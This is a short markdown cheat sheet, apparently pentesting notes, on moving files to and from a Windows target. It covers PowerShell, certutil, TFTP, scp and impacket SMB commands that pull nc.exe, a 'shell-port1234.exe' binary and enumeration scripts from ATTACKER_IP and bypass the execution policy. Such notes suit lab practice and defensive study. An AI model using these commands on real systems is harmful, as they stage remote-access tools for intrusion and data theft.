# windows files transter 
> ways to transfer files between your machine and windows machine

1. **powershell**
```bash
#Download And Execute a file using Powershell:  
  
powershell Invoke-WebRequest -Uri <IP>:8001/nc.exe -OutFile C:\\Users\\Administrator\\downloads\\nc.exe

#Download a file using Powershell:  
  
powershell -Command ((new-object System.Net.WebClient).Downloadfile('http://<IP>/jaw.ps1', 'jaw.ps1'))

#Incase powershell blocked

echo $storageDir = $pwd > wget.ps1  
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = "[http://ATTACKER\_IP/nc.exe"](http://ATTACKER_IP/nc.exe) >>wget.ps1  
echo $file = "nc.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1

Execution:  
  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

----------------
2. **cert util**
```bash
 certutil.exe -urlcache -split -f "http://192.168.119.235:800/shell-port1234.exe"  
  
  
certutil.exe -urlcache -split -f "http://<IP>/Powerless.bat" Powerless.bat
```

------------------------
3. **TFTP**
```bash
    
#On Your Kali Machine:
  
mkdir /share  
  
atftpd --daemon --port 69 /share  
  
cp /usr/share/windows-binaries/nc.exe /share/ //Copy nc.exe to share folder  
  

#On Target Machine:

  
  
tftp -i ATTACKER\_IP get nc.exe
```
----------------
4. **ssh(scp)**
```bash
#To copy a file from a local to a remote system  
  
  
scp file.txt remote\_username@10.10.0.2:/remote/directory  
  
  
#To copy a directory from a local to remote system  
  
  
scp -r /local/directory remote\_username@10.10.0.2:/remote/directory
```
--------------
5. **SMB**
```bash
#Download a file from Kali to Windows  
  
  
Kali:  
  
impacket-smbserver share \`pwd\`  
  
Windows:  
  
copy \\\\<IP>\\f<filename>  
  
  
#Upload file from Windows to Kali  
  
Kali:  
  
impacket-smbserver share \`pwd\`  
  
  
  
Windows:  
  
copy <filename> \\\\<IP>\\<sharename>
```